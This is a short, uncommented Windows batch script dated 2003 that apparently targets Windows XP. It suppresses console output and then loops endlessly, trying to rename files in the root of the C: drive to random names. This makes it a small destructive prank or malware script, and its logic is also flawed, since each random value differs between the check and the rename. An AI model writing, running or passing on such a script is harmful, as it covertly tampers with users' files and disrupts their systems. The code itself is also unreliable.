::
:: 19.05.2003
::
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :XP
:XP
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
if exist c:\%random%. (ren c:\%random% %random%.) else echo c:\%random%. missing
goto XP
ctty con
exit
:done
ctty con
cls
